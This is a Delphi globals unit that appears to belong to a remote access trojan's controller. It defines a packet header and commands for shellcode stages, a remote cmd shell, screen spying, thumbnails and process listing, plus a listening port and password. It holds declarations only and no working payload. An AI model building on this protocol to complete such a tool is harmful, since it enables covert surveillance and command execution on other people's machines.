unit UnitGlobal;

interface
uses
  Winapi.Windows;

const
  WM_USER = $400;
  WM_CONNECTED = WM_USER + 1;
  WM_DISCONNECTED = WM_USER + 2;
  WM_CLIENT_MESSAGE = WM_USER + 3;
  WM_ADD_STATS = WM_USER + 4;

const
  PACKET_HEADER_SIGNATURE = $deedbeef;
  MIN_COMPRESS_DATA_SIZE = 512;

type
  PPROTO_HEADER = ^TPROTO_HEADER;
  TPROTO_HEADER = packed record
    random: UInt32;
    signature: UInt32;
    cmd: UInt8;
    packet_unpacked_size: UInt32;
    packet_size: UInt32;
  end;

  TCOMMAND = (
    CMD_SHELLCODE_MAIN,           // shell code main
    CMD_SHELLCODE_INFORMATION,    // shellcode information
    CMD_SHELLCODE_CMD_SHELL,      // cmd_shell
    CMD_SHELLCODE_THUMBNAIL,      // thumbnail
    CMD_SHELLCODE_SCREENSPY,      // screenspy
    CMD_SHELLCODE_PROCESS,        // process

    CMD_PING,                 // ping
    CMD_PONG,                 // ping回复包

    CMD_LOGIN_INFO,           // 登陆信息

    CMD_GET_PROCESS_LIST,     // 获取进程列表
    CMD_PROCESS_LIST,         // 进程列表

    CMD_BEGIN_SCREENSPY,      // 开启屏幕监控
    CMD_STOP_SCREENSPY,       // 关闭屏幕监控

    CMD_SCREENSPY_START,      // 开启完成通知
    CMD_SCREENSPY_DATA,       // 屏幕监控数据
    CMD_SCREENSPY_END,        // 关闭完成通知

    CMD_THUMBANIL_START,      // 循环获取缩略图
    CMD_THUMBNAIL_DATA,       // 屏幕缩略图数据
    CMD_THUMBANIL_END,        // 捕获缩略图结束

    CMD_BEGIN_CMDSHELL,       // 开启cmdshell
    CMD_STOP_CMDSHELL,        // 关闭cmdshell

    CMD_CMDSHELL_START,       // 开启完成通知
    CMD_CMDSHELL_DATA,        // cmd数据，server to client = command, client to server = cmdshell data
    CMD_CMDSHELL_END          // 关闭完成通知
  );

const
  CmdStrings: array [0..23] of string = (
    'CMD_SHELLCODE_MAIN',
    'CMD_SHELLCODE_INFORMATION',
    'CMD_SHELLCODE_CMD_SHELL',
    'CMD_SHELLCODE_THUMBNAIL',
    'CMD_SHELLCODE_SCREENSPY',
    'CMD_SHELLCODE_PROCESS',

    'CMD_PING',
    'CMD_PONG',

    'CMD_LOGIN_INFO',

    'CMD_GET_PROCESS_LIST',
    'CMD_PROCESS_LIST',

    'CMD_BEGIN_SCREENSPY',
    'CMD_STOP_SCREENSPY',

    'CMD_SCREENSPY_START',
    'CMD_SCREENSPY_DATA',
    'CMD_SCREENSPY_END',

    'CMD_THUMBANIL_START',
    'CMD_THUMBNAIL_DATA',
    'CMD_THUMBANIL_END',

    'CMD_BEGIN_CMDSHELL',
    'CMD_STOP_CMDSHELL',

    'CMD_CMDSHELL_START',
    'CMD_CMDSHELL_DATA',
    'CMD_CMDSHELL_END'
  );

var
  g_ListeningPort: Integer;
  g_Password: AnsiString;
  g_ShowBalloonHint, g_TreeVeiwLayout, g_ShowThumbnail: Boolean;
  g_TotalConnections, g_TotalAttempts, g_Sent_UnCompressed, g_Recv_UnCompressed: Int64;

implementation


end.
